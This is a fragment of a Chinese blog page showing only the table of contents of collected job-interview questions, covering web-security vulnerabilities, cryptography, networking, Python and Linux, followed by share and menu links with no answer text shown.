href="#%E5%AE%89%E5%85%A8%E7%99%BB%E5%BD%95%E6%A1%86%E8%AE%BE%E8%AE%A1"><span class="toc-number">7.1.</span> <span class="toc-text">安全登录框设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%A1%E9%AA%8C%E5%90%88%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E6%A8%A1%E5%BC%8F"><span class="toc-number">7.2.</span> <span class="toc-text">校验合法登录的模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B"><span class="toc-number">7.3.</span> <span class="toc-text">登录流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E5%92%8C%E4%BA%8B%E4%BB%B6%E7%AE%A1%E7%90%86-SIEM-%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">8.</span> <span class="toc-text">对安全信息和事件管理(SIEM)系统的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-CSRF%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">9.</span> <span class="toc-text">8. CSRF攻击及防范</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF-%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E6%9C%80%E5%A4%A7%E5%8C%96"><span class="toc-number">10.</span> <span class="toc-text">CRLF 漏洞如何利用最大化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%BB%E8%A6%81%E6%B6%89%E5%8F%8A%E4%BB%A5%E4%B8%8B%E5%87%A0%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">11.</span> <span class="toc-text">Fastjson的反序列化漏洞利用链主要涉及以下几个步骤：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">Log4j漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS%E9%99%8D%E7%BA%A7%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text">TLS降级漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">14.</span> <span class="toc-text">HTTP请求走私漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSPF%E7%AE%97%E6%B3%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">15.</span> <span class="toc-text">OSPF算法的基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8A%E6%89%AB%E6%8F%8F"><span class="toc-number">16.</span> <span class="toc-text">半扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81"><span class="toc-number">17.</span> <span class="toc-text">Shiro漏洞特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-number">18.</span> <span class="toc-text">AES加密原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">19.</span> <span class="toc-text">进程和线程的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E5%8E%9F%E7%90%86"><span class="toc-number">20.</span> <span class="toc-text">（2）冒泡排序原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">21.</span> <span class="toc-text">（1）进程和线程的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E5%8E%9F%E7%90%86-1"><span class="toc-number">22.</span> <span class="toc-text">（2）冒泡排序原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E3%80%81%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%BB%A5%E5%8F%8Ahash%E7%AE%97%E6%B3%95%E4%B8%BE%E4%BE%8B%E5%8F%8A%E7%AE%97%E6%B3%95%E6%B5%81%E7%A8%8B%E7%BB%86%E8%8A%82"><span class="toc-number">23.</span> <span class="toc-text">（6）对称加密、非对称加密以及hash算法举例及算法流程细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89SHA-1%E5%92%8CSHA-2%E5%8C%BA%E5%88%AB"><span class="toc-number">24.</span> <span class="toc-text">（7）SHA-1和SHA-2区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3%E4%B8%8BECC"><span class="toc-number">25.</span> <span class="toc-text">详细讲解下ECC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3"><span class="toc-number">26.</span> <span class="toc-text">逆向相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3"><span class="toc-number">27.</span> <span class="toc-text">爬虫相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%92%8C%E9%9D%9E%E7%BC%96%E8%AF%91%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">28.</span> <span class="toc-text">编译和非编译的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CodeQL%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E8%A2%AB%E4%BF%AE%E6%94%B9%E4%B8%BA%E6%97%A0%E9%9C%80%E7%BC%96%E8%AF%91%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">29.</span> <span class="toc-text">4. CodeQL是否可以被修改为无需编译的工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BA%86%E8%A7%A3%E5%93%AA%E4%BA%9B%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E4%BD%95%E7%94%A8CodeQL%E6%A3%80%E6%B5%8B"><span class="toc-number">30.</span> <span class="toc-text">5. 了解哪些类型的漏洞，如何用CodeQL检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%AD%E8%A1%8C%E7%9A%84%E7%94%B5%E5%AD%90%E5%8F%A3%E4%BB%A4%E5%8D%A1%EF%BC%8C%E4%B8%8A%E9%9D%A2%E6%98%BE%E7%A4%BA%E7%9A%84%E5%AD%97%E7%AC%A6%E6%AF%8F%E4%B8%80%E5%88%86%E9%92%9F%E5%8F%98%E6%8D%A2%E4%B8%80%E6%AC%A1%E3%80%82%E9%97%AE%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E3%80%82"><span class="toc-number">31.</span> <span class="toc-text">1. 中行的电子口令卡，上面显示的字符每一分钟变换一次。问实现方法。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%B9%E5%BE%85%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E6%80%8E%E4%B9%88%E5%8E%BB%E6%80%9D%E8%80%83%EF%BC%9F"><span class="toc-number">32.</span> <span class="toc-text">3. 对待一个问题怎么去思考？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-PKI%E7%9A%84%E6%9E%B6%E6%9E%84"><span class="toc-number">33.</span> <span class="toc-text">5. PKI的架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-DMZ%E7%9A%84%E4%BD%9C%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%BD%8D%E7%BD%AE"><span class="toc-number">34.</span> <span class="toc-text">10. DMZ的作用以及位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%88%86%E5%87%BA%E7%9A%84Tomcat-AJP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">35.</span> <span class="toc-text">最新爆出的Tomcat AJP协议漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%A6%82%E6%9E%9C%E8%A2%ABban-IP%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">36.</span> <span class="toc-text">渗透测试过程中如果被ban IP怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">37.</span> <span class="toc-text">SQL注入单引号被过滤了怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passwd%E4%B8%8Eshadow%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">38.</span> <span class="toc-text">passwd与shadow文件的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%80%8E%E6%A0%B7%E4%BB%8E%E6%96%87%E4%BB%B6%E9%80%89%E5%8F%96%E5%8C%85%E5%90%AB%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E7%9A%84%E8%A1%8C%EF%BC%8C%E5%B9%B6%E6%9B%BF%E6%8D%A2%E7%9B%B8%E5%85%B3%E5%AD%97%E7%AC%A6"><span class="toc-number">39.</span> <span class="toc-text">Linux怎样从文件选取包含特定字符的行，并替换相关字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VRRP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0"><span class="toc-number">40.</span> <span class="toc-text">VRRP协议的原理及实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%82%A3%E4%BA%9B%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E6%98%AF%E7%BB%9D%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84%E4%B9%88%EF%BC%9F"><span class="toc-number">41.</span> <span class="toc-text">SQL注入的那些防御措施是绝对安全的么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%8CNmap%E6%89%AB%E6%8F%8F%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82%EF%BC%8C%E9%92%88%E5%AF%B9%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%BD%BF%E7%94%A8%E5%93%AA%E7%A7%8D%E6%89%AB%E6%8F%8F"><span class="toc-number">42.</span> <span class="toc-text">Nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%B9%E5%A4%96%E4%BD%BF%E7%94%A8nmap%E6%89%AB%E6%8F%8F%EF%BC%8C%E9%81%87%E5%88%B0-%E7%9A%84%E6%83%85%E5%86%B5%E5%8F%88%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">43.</span> <span class="toc-text">如何对外使用nmap扫描，遇到***的情况又该怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9A%84%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%EF%BC%8CIP%E6%AC%BA%E9%AA%97%EF%BC%8C%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8B%A6%E6%88%AA"><span class="toc-number">44.</span> <span class="toc-text">网络层的常见攻击方式，IP欺骗，第三方拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASP%E4%B8%8EPHP%E7%BD%91%E7%AB%99%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">45.</span> <span class="toc-text">ASP与PHP网站的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E5%8F%ABDMA"><span class="toc-number">46.</span> <span class="toc-text">什么叫DMA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">47.</span> <span class="toc-text">获取网站绝对路径的四种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">48.</span> <span class="toc-text">如何防止SQL注入，具体的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLmap%E4%B8%AD-T%E7%9F%A5%E9%81%93%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%E5%90%97%EF%BC%9F"><span class="toc-number">49.</span> <span class="toc-text">SQLmap中-T知道什么意思吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%88%97%E8%A1%A8%E6%8E%A8%E5%AF%BC"><span class="toc-number">50.</span> <span class="toc-text">Python列表推导</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%90%E4%B8%AA%E7%B1%BB%E6%98%AF%E5%90%A6%E6%9C%89%E6%9F%90%E7%A7%8D%E5%B1%9E%E6%80%A7"><span class="toc-number">51.</span> <span class="toc-text">判断某个类是否有某种属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-%E5%92%8C-new"><span class="toc-number">52.</span> <span class="toc-text">init 和 new</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">53.</span> <span class="toc-text">装饰器应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95-staticmethod"><span class="toc-number">54.</span> <span class="toc-text">静态方法 staticmethod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E6%9F%90%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%8D%A0%E7%94%A8%E5%AE%83%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8F%B7"><span class="toc-number">55.</span> <span class="toc-text">已知某端口，查看占用它的进程号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E6%9F%90%E4%B8%AA-a-py-%E8%BF%9B%E7%A8%8B%E8%B7%91%E7%9D%80%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%85%B6%E7%AB%AF%E5%8F%A3"><span class="toc-number">56.</span> <span class="toc-text">已知某个 a.py 进程跑着，查看其端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%80%E6%AD%BB%E6%9C%BA%E5%99%A8%E6%89%80%E6%9C%89-python-%E8%BF%9B%E7%A8%8B%E3%80%81"><span class="toc-number">57.</span> <span class="toc-text">杀死机器所有 python 进程、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB-%E5%92%8C-MySQL"><span class="toc-number">58.</span> <span class="toc-text">MongoDB 和 MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#INNER-JOIN-LEFT-JOIN-RIGHT-JOIN"><span class="toc-number">59.</span> <span class="toc-text">INNER JOIN, LEFT JOIN, RIGHT JOIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">60.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-%E5%9C%B0%E5%9D%80%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E7%9A%84%E7%BB%9F%E8%AE%A1"><span class="toc-number">61.</span> <span class="toc-text">IP 地址出现次数的统计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F"><span class="toc-number">62.</span> <span class="toc-text">工厂模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="toc-number">63.</span> <span class="toc-text">Java 如何保证线程安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CPU-%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E4%BD%86%E7%BB%93%E6%9E%9C%E8%BF%94%E5%9B%9E%E5%BE%88%E6%85%A2%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%E5%86%B3"><span class="toc-number">64.</span> <span class="toc-text">CPU 占用过高但结果返回很慢的原因及解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%E5%86%B3"><span class="toc-number">65.</span> <span class="toc-text">内存占用过高的原因及解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%BA%BF%E7%A8%8B%E6%95%B0%E9%87%8F%E7%9A%84%E8%AE%BE%E7%BD%AE"><span class="toc-number">66.</span> <span class="toc-text">线程池线程数量的设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91AK-SK%E7%9B%B8%E5%85%B3%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">67.</span> <span class="toc-text">云AK&#x2F;SK相关的利用和防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%8F%AA%E6%9C%89%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">68.</span> <span class="toc-text">在只有任意文件读取的情况下有什么利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%BC%80%E4%BA%86%E4%BB%80%E4%B9%88%E6%9C%8D%E5%8A%A1%EF%BC%88-proc-pid-cmdline%EF%BC%89"><span class="toc-number">69.</span> <span class="toc-text">怎么找开了什么服务（&#x2F;proc&#x2F;pid&#x2F;cmdline）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">70.</span> <span class="toc-text">怎么找配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6-etc-rc-d-rc-local%E3%80%81-etc-init-d"><span class="toc-number">71.</span> <span class="toc-text">Linux开机自启动文件&#x2F;etc&#x2F;rc.d&#x2F;rc.local、&#x2F;etc&#x2F;init.d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSO%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">72.</span> <span class="toc-text">SSO相关的攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8A%A8%E6%80%81token"><span class="toc-number">73.</span> <span class="toc-text">怎么绕过动态token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81"><span class="toc-number">74.</span> <span class="toc-text">怎么绕过双因子认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%80%8E%E4%B9%88%E6%89%93"><span class="toc-number">75.</span> <span class="toc-text">域环境怎么打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">76.</span> <span class="toc-text">IIS文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">77.</span> <span class="toc-text">Redis攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="toc-number">78.</span> <span class="toc-text">Redis主从复制条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">79.</span> <span class="toc-text">JWT攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="toc-number">80.</span> <span class="toc-text">栈溢出原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">81.</span> <span class="toc-text">栈溢出保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF-%E6%8F%90%E6%9D%83"><span class="toc-number">82.</span> <span class="toc-text">UDF 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B9%E6%B3%95"><span class="toc-number">83.</span> <span class="toc-text">服务器启动项提权怎么做，有什么方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF-%E6%8F%90%E6%9D%83%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84"><span class="toc-number">84.</span> <span class="toc-text">MOF 提权是怎么实现的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E6%80%8E%E4%B9%88%E7%9C%8B%E6%97%A5%E5%BF%97%EF%BC%8C%E7%94%A8%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">85.</span> <span class="toc-text">Linux 怎么看日志，用哪些命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crontab-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9F%A5%E9%81%93%E5%90%97"><span class="toc-number">86.</span> <span class="toc-text">Crontab 定时任务知道吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#58%E4%B8%80%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%81%AD%E5%8F%97ARP%E6%AC%BA%E9%AA%97%EF%BC%8C%E6%80%8E%E4%B9%88%E6%8E%92%E6%9F%A5%EF%BC%9F"><span class="toc-number">87.</span> <span class="toc-text">58一个服务器遭受ARP欺骗，怎么排查？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8"><span class="toc-number">88.</span> <span class="toc-text">怎么查看端口占用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E6%9C%80%E5%A4%9A%E5%AD%98%E5%A4%9A%E5%B0%91%E6%9D%A1%E8%AE%B0%E5%BD%95"><span class="toc-number">89.</span> <span class="toc-text">一张数据库表最多存多少条记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">90.</span> <span class="toc-text">遇到子域名泛解析怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E6%89%8B%E6%AE%B5%EF%BC%8C135%E3%80%81445%E7%AB%AF%E5%8F%A3"><span class="toc-number">91.</span> <span class="toc-text">内网渗透横向手段，135、445端口</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/16/work/workpre3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/16/work/workpre3/&text=【工作】面试题整理 网络收集问题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/16/work/workpre3/&is_video=false&description=【工作】面试题整理 网络收集问题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 网络收集问题&body=Check out this article: https://godreams.cn/2024/03/16/work/workpre3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/16/work/workpre3/&title=【工作】面试题整理 网络收集问题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/16/work/workpre3/&name=【工作】面试题整理 网络收集问题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/16/work/workpre3/&t=【工作】面试题整理 网络收集问题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
